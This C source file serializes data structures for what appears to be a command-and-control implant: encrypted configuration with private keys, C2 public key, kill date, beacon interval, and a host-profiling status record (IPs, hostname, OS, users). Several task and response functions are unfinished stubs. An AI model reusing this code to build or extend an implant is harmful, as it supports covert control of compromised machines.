#include "flatty.h"
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <endian.h>

// String serialization - compatible with Nim's flatty
int serialize_string(const char* str, uint8_t** result, size_t* result_len) {
    if (!str || !result || !result_len) return -1;
    
    size_t str_len = strlen(str);
    size_t total_len = 8 + str_len; // 8 bytes for length prefix + string data
    
    *result = malloc(total_len);
    if (!*result) return -1;
    
    // Write length as little-endian uint64
    uint64_t le_len = htole64(str_len);
    memcpy(*result, &le_len, 8);
    
    // Write string data
    memcpy(*result + 8, str, str_len);
    
    *result_len = total_len;
    return 0;
}

int deserialize_string(const uint8_t* data, size_t data_len, size_t offset, 
                      char** result, size_t* new_offset) {
    if (!data || !result || !new_offset || offset + 8 > data_len) return -1;
    
    // Read length
    uint64_t str_len = le64toh(*(uint64_t*)(data + offset));
    offset += 8;
    
    if (offset + str_len > data_len) return -1;
    
    // Allocate and copy string
    *result = malloc(str_len + 1);
    if (!*result) return -1;
    
    memcpy(*result, data + offset, str_len);
    (*result)[str_len] = '\0';
    
    *new_offset = offset + str_len;
    return 0;
}

// Integer serialization
int serialize_int32(int32_t value, uint8_t** result, size_t* result_len) {
    if (!result || !result_len) return -1;
    
    *result = malloc(4);
    if (!*result) return -1;
    
    uint32_t le_value = htole32((uint32_t)value);
    memcpy(*result, &le_value, 4);
    *result_len = 4;
    return 0;
}

int deserialize_int32(const uint8_t* data, size_t data_len, size_t offset, 
                     int32_t* result, size_t* new_offset) {
    if (!data || !result || !new_offset || offset + 4 > data_len) return -1;
    
    uint32_t le_value = *(uint32_t*)(data + offset);
    *result = (int32_t)le32toh(le_value);
    *new_offset = offset + 4;
    return 0;
}

int serialize_int64(int64_t value, uint8_t** result, size_t* result_len) {
    if (!result || !result_len) return -1;
    
    *result = malloc(8);
    if (!*result) return -1;
    
    uint64_t le_value = htole64((uint64_t)value);
    memcpy(*result, &le_value, 8);
    *result_len = 8;
    return 0;
}

int deserialize_int64(const uint8_t* data, size_t data_len, size_t offset, 
                     int64_t* result, size_t* new_offset) {
    if (!data || !result || !new_offset || offset + 8 > data_len) return -1;
    
    uint64_t le_value = *(uint64_t*)(data + offset);
    *result = (int64_t)le64toh(le_value);
    *new_offset = offset + 8;
    return 0;
}

// Boolean serialization  
int serialize_bool(int value, uint8_t** result, size_t* result_len) {
    if (!result || !result_len) return -1;
    
    *result = malloc(1);
    if (!*result) return -1;
    
    (*result)[0] = value ? 1 : 0;
    *result_len = 1;
    return 0;
}

int deserialize_bool(const uint8_t* data, size_t data_len, size_t offset, 
                    int* result, size_t* new_offset) {
    if (!data || !result || !new_offset || offset + 1 > data_len) return -1;
    
    *result = data[offset] ? 1 : 0;
    *new_offset = offset + 1;
    return 0;
}

// Bytes serialization (for sequences)
int serialize_bytes(const uint8_t* data, size_t len, uint8_t** result, size_t* result_len) {
    if (!data || !result || !result_len) return -1;
    
    size_t total_len = 8 + len; // 8 bytes for length + data
    
    *result = malloc(total_len);
    if (!*result) return -1;
    
    // Write length as little-endian uint64
    uint64_t le_len = htole64(len);
    memcpy(*result, &le_len, 8);
    
    // Write data
    memcpy(*result + 8, data, len);
    
    *result_len = total_len;
    return 0;
}

int deserialize_bytes(const uint8_t* data, size_t data_len, size_t offset, 
                     uint8_t** result, size_t* result_bytes_len, size_t* new_offset) {
    if (!data || !result || !result_bytes_len || !new_offset || offset + 8 > data_len) return -1;
    
    // Read length
    uint64_t bytes_len = le64toh(*(uint64_t*)(data + offset));
    offset += 8;
    
    if (offset + bytes_len > data_len) return -1;
    
    // Allocate and copy data
    *result = malloc(bytes_len);
    if (!*result) return -1;
    
    memcpy(*result, data + offset, bytes_len);
    *result_bytes_len = bytes_len;
    *new_offset = offset + bytes_len;
    return 0;
}

// Key serialization (just raw 32 bytes)
int to_flatty_key(const Key* key, uint8_t** result, size_t* result_len) {
    if (!key || !result || !result_len) return -1;
    
    *result = malloc(32);
    if (!*result) return -1;
    
    memcpy(*result, key->data, 32);
    *result_len = 32;
    return 0;
}

int from_flatty_key(const uint8_t* data, size_t data_len, Key* result) {
    if (!data || !result || data_len < 32) return -1;
    
    memcpy(result->data, data, 32);
    return 0;
}

// EncObj serialization - compatible with Nim's EncObj structure
int to_flatty_enc_obj(const EncObj* enc_obj, uint8_t** result, size_t* result_len) {
    if (!enc_obj || !result || !result_len) return -1;
    
    // EncObj structure: publicKey(32) + nonce(24) + mac(16) + cipherLen(8) + cipherText_len(8) + cipherText
    size_t total_len = 32 + 24 + 16 + 8 + 8 + enc_obj->cipherLen;
    
    *result = malloc(total_len);
    if (!*result) return -1;
    
    uint8_t* ptr = *result;
    
    // publicKey (32 bytes)
    memcpy(ptr, enc_obj->publicKey.data, 32);
    ptr += 32;
    
    // nonce (24 bytes)
    memcpy(ptr, enc_obj->nonce.data, 24);
    ptr += 24;
    
    // mac (16 bytes)
    memcpy(ptr, enc_obj->mac.data, 16);
    ptr += 16;
    
    // cipherLen (8 bytes, little-endian)
    uint64_t le_cipher_len = htole64(enc_obj->cipherLen);
    memcpy(ptr, &le_cipher_len, 8);
    ptr += 8;
    
    // cipherText sequence length (8 bytes, little-endian) - should match cipherLen
    uint64_t le_seq_len = htole64(enc_obj->cipherLen);
    memcpy(ptr, &le_seq_len, 8);
    ptr += 8;
    
    // cipherText data
    memcpy(ptr, enc_obj->cipherText, enc_obj->cipherLen);
    
    *result_len = total_len;
    return 0;
}

int from_flatty_enc_obj(const uint8_t* data, size_t data_len, EncObj* result, size_t* bytes_consumed) {
    if (!data || !result || !bytes_consumed || data_len < 32 + 24 + 16 + 8 + 8) return -1;
    
    size_t offset = 0;
    
    // publicKey (32 bytes)
    memcpy(result->publicKey.data, data + offset, 32);
    offset += 32;
    
    // nonce (24 bytes)
    memcpy(result->nonce.data, data + offset, 24);
    offset += 24;
    
    // mac (16 bytes)
    memcpy(result->mac.data, data + offset, 16);
    offset += 16;
    
    // cipherLen (8 bytes)
    result->cipherLen = (int64_t)le64toh(*(uint64_t*)(data + offset));
    offset += 8;
    
    // sequence length (8 bytes) - should match cipherLen
    int64_t seq_len = (int64_t)le64toh(*(uint64_t*)(data + offset));
    offset += 8;
    
    if (result->cipherLen != seq_len) return -1; // Mismatch
    
    if (offset + result->cipherLen > data_len) return -1;
    
    // Allocate and copy cipherText
    result->cipherText = malloc(result->cipherLen);
    if (!result->cipherText) return -1;
    
    memcpy(result->cipherText, data + offset, result->cipherLen);
    offset += result->cipherLen;
    
    *bytes_consumed = offset;
    return 0;
}

// EncConfig serialization - compatible with Nim's EncConfig (ref object)
int to_flatty_enc_config(const EncConfig* config, uint8_t** result, size_t* result_len) {
    if (!config || !result || !result_len) return -1;
    
    // EncConfig is a ref object in Nim, so it starts with a ref indicator byte
    uint8_t* enc_obj_data;
    size_t enc_obj_len;
    
    if (to_flatty_enc_obj(&config->encObj, &enc_obj_data, &enc_obj_len) != 0) {
        return -1;
    }
    
    size_t total_len = 1 + 32 + 32 + enc_obj_len; // ref_byte + privKey + pubKey + encObj
    
    *result = malloc(total_len);
    if (!*result) {
        free(enc_obj_data);
        return -1;
    }
    
    uint8_t* ptr = *result;
    
    // ref indicator byte (0 = not nil)
    *ptr = 0;
    ptr++;
    
    // privKey (32 bytes)
    memcpy(ptr, config->privKey.data, 32);
    ptr += 32;
    
    // pubKey (32 bytes)
    memcpy(ptr, config->pubKey.data, 32);
    ptr += 32;
    
    // encObj
    memcpy(ptr, enc_obj_data, enc_obj_len);
    
    free(enc_obj_data);
    *result_len = total_len;
    return 0;
}

int from_flatty_enc_config(const uint8_t* data, size_t data_len, EncConfig* result) {
    if (!data || !result || data_len < 1 + 32 + 32) return -1;
    
    size_t offset = 0;
    
    // Skip ref indicator byte (might be 0 for not nil)
    if (data[offset] == 0) {
        offset = 1;
    }
    
    // privKey (32 bytes)
    if (offset + 32 > data_len) return -1;
    memcpy(result->privKey.data, data + offset, 32);
    offset += 32;
    
    // pubKey (32 bytes)
    if (offset + 32 > data_len) return -1;
    memcpy(result->pubKey.data, data + offset, 32);
    offset += 32;
    
    // encObj
    size_t enc_obj_consumed;
    if (from_flatty_enc_obj(data + offset, data_len - offset, &result->encObj, &enc_obj_consumed) != 0) {
        return -1;
    }
    
    return 0;
}

// StaticConfig serialization - compatible with Nim's StaticConfig (ref object)
int to_flatty_static_config(const StaticConfig* config, uint8_t** result, size_t* result_len) {
    if (!config || !result || !result_len) return -1;
    
    // Serialize individual fields
    uint8_t* build_id_data;
    size_t build_id_len;
    if (serialize_string(config->buildID ? config->buildID : "", &build_id_data, &build_id_len) != 0) {
        return -1;
    }
    
    uint8_t* deployment_id_data;
    size_t deployment_id_len;
    if (serialize_string(config->deploymentID ? config->deploymentID : "", &deployment_id_data, &deployment_id_len) != 0) {
        free(build_id_data);
        return -1;
    }
    
    uint8_t* callback_data;
    size_t callback_len;
    if (serialize_string(config->callback ? config->callback : "", &callback_data, &callback_len) != 0) {
        free(build_id_data);
        free(deployment_id_data);
        return -1;
    }
    
    uint8_t* kill_epoch_data;
    size_t kill_epoch_len;
    if (serialize_int32(config->killEpoch, &kill_epoch_data, &kill_epoch_len) != 0) {
        free(build_id_data);
        free(deployment_id_data);
        free(callback_data);
        return -1;
    }
    
    uint8_t* interval_data;
    size_t interval_len;
    if (serialize_int32(config->interval, &interval_data, &interval_len) != 0) {
        free(build_id_data);
        free(deployment_id_data);
        free(callback_data);
        free(kill_epoch_data);
        return -1;
    }
    
    // Calculate total size: ref_byte + all serialized fields + c2PubKey(32)
    size_t total_len = 1 + build_id_len + deployment_id_len + 32 + kill_epoch_len + interval_len + callback_len;
    
    *result = malloc(total_len);
    if (!*result) {
        free(build_id_data);
        free(deployment_id_data);
        free(callback_data);
        free(kill_epoch_data);
        free(interval_data);
        return -1;
    }
    
    uint8_t* ptr = *result;
    
    // ref indicator byte (0 = not nil)
    *ptr = 0;
    ptr++;
    
    // buildID
    memcpy(ptr, build_id_data, build_id_len);
    ptr += build_id_len;
    
    // deploymentID
    memcpy(ptr, deployment_id_data, deployment_id_len);
    ptr += deployment_id_len;
    
    // c2PubKey (32 bytes)
    memcpy(ptr, config->c2PubKey.data, 32);
    ptr += 32;
    
    // killEpoch
    memcpy(ptr, kill_epoch_data, kill_epoch_len);
    ptr += kill_epoch_len;
    
    // interval
    memcpy(ptr, interval_data, interval_len);
    ptr += interval_len;
    
    // callback
    memcpy(ptr, callback_data, callback_len);
    
    // Cleanup
    free(build_id_data);
    free(deployment_id_data);
    free(callback_data);
    free(kill_epoch_data);
    free(interval_data);
    
    *result_len = total_len;
    return 0;
}

int from_flatty_static_config(const uint8_t* data, size_t data_len, StaticConfig* result, size_t* bytes_consumed) {
    if (!data || !result || !bytes_consumed || data_len < 1) return -1;
    
    size_t offset = 0;
    
    // Check and skip ref indicator byte
    int is_nil = data[offset] == 1;
    offset++;
    
    if (is_nil) {
        // Handle nil StaticConfig - clear result
        memset(result, 0, sizeof(StaticConfig));
        *bytes_consumed = offset;
        return 0;
    }
    
    // buildID
    if (deserialize_string(data, data_len, offset, &result->buildID, &offset) != 0) {
        return -1;
    }
    
    // deploymentID
    if (deserialize_string(data, data_len, offset, &result->deploymentID, &offset) != 0) {
        return -1;
    }
    
    // c2PubKey (32 bytes)
    if (offset + 32 > data_len) return -1;
    memcpy(result->c2PubKey.data, data + offset, 32);
    offset += 32;
    
    // killEpoch
    if (deserialize_int32(data, data_len, offset, &result->killEpoch, &offset) != 0) {
        return -1;
    }
    
    // interval
    if (deserialize_int32(data, data_len, offset, &result->interval, &offset) != 0) {
        return -1;
    }
    
    // callback
    if (deserialize_string(data, data_len, offset, &result->callback, &offset) != 0) {
        return -1;
    }
    
    *bytes_consumed = offset;
    return 0;
}

// Status serialization
int to_flatty_status(const Status* status, uint8_t** result, size_t* result_len) {
    if (!status || !result || !result_len) return -1;
    
    // Serialize all string fields and bootTime
    uint8_t* field_data[6];
    size_t field_lens[6];
    
    const char* fields[] = {
        status->ip ? status->ip : "",
        status->externalIP ? status->externalIP : "",
        status->hostname ? status->hostname : "",
        status->os ? status->os : "",
        status->arch ? status->arch : "",
        status->users ? status->users : ""
    };
    
    // Serialize all string fields
    for (int i = 0; i < 6; i++) {
        if (serialize_string(fields[i], &field_data[i], &field_lens[i]) != 0) {
            // Cleanup on error
            for (int j = 0; j < i; j++) {
                free(field_data[j]);
            }
            return -1;
        }
    }
    
    // Serialize bootTime
    uint8_t* boot_time_data;
    size_t boot_time_len;
    if (serialize_int64(status->bootTime, &boot_time_data, &boot_time_len) != 0) {
        for (int i = 0; i < 6; i++) {
            free(field_data[i]);
        }
        return -1;
    }
    
    // Calculate total size
    size_t total_len = boot_time_len;
    for (int i = 0; i < 6; i++) {
        total_len += field_lens[i];
    }
    
    *result = malloc(total_len);
    if (!*result) {
        for (int i = 0; i < 6; i++) {
            free(field_data[i]);
        }
        free(boot_time_data);
        return -1;
    }
    
    uint8_t* ptr = *result;
    
    // Copy all field data
    for (int i = 0; i < 6; i++) {
        memcpy(ptr, field_data[i], field_lens[i]);
        ptr += field_lens[i];
        free(field_data[i]);
    }
    
    // Copy bootTime
    memcpy(ptr, boot_time_data, boot_time_len);
    free(boot_time_data);
    
    *result_len = total_len;
    return 0;
}

int from_flatty_status(const uint8_t* data, size_t data_len, Status* result, size_t* bytes_consumed) {
    if (!data || !result || !bytes_consumed) return -1;
    
    size_t offset = 0;
    
    // Deserialize all string fields in order
    if (deserialize_string(data, data_len, offset, &result->ip, &offset) != 0) return -1;
    if (deserialize_string(data, data_len, offset, &result->externalIP, &offset) != 0) return -1;
    if (deserialize_string(data, data_len, offset, &result->hostname, &offset) != 0) return -1;
    if (deserialize_string(data, data_len, offset, &result->os, &offset) != 0) return -1;
    if (deserialize_string(data, data_len, offset, &result->arch, &offset) != 0) return -1;
    if (deserialize_string(data, data_len, offset, &result->users, &offset) != 0) return -1;
    
    // Deserialize bootTime
    if (deserialize_int64(data, data_len, offset, &result->bootTime, &offset) != 0) return -1;
    
    *bytes_consumed = offset;
    return 0;
}

// Other complex types can be implemented similarly...
// For now, let's implement stub versions

int to_flatty_callback(const Callback* callback, uint8_t** result, size_t* result_len) {
    // TODO: Implement full callback serialization
    if (!callback || !result || !result_len) return -1;
    *result = malloc(1);
    (*result)[0] = 0; // Stub
    *result_len = 1;
    return 0;
}

int from_flatty_callback(const uint8_t* data, size_t data_len, Callback* result, size_t* bytes_consumed) {
    // TODO: Implement full callback deserialization
    if (!data || !result || !bytes_consumed) return -1;
    *bytes_consumed = 1;
    return 0;
}

int to_flatty_task(const Task* task, uint8_t** result, size_t* result_len) {
    // TODO: Implement full task serialization
    if (!task || !result || !result_len) return -1;
    *result = malloc(1);
    (*result)[0] = 0; // Stub
    *result_len = 1;
    return 0;
}

int from_flatty_task(const uint8_t* data, size_t data_len, Task* result, size_t* bytes_consumed) {
    // TODO: Implement full task deserialization
    if (!data || !result || !bytes_consumed) return -1;
    *bytes_consumed = 1;
    return 0;
}

int to_flatty_resp(const Resp* resp, uint8_t** result, size_t* result_len) {
    // TODO: Implement full resp serialization
    if (!resp || !result || !result_len) return -1;
    *result = malloc(1);
    (*result)[0] = 0; // Stub
    *result_len = 1;
    return 0;
}

int from_flatty_resp(const uint8_t* data, size_t data_len, Resp* result, size_t* bytes_consumed) {
    // TODO: Implement full resp deserialization
    if (!data || !result || !bytes_consumed) return -1;
    *bytes_consumed = 1;
    return 0;
}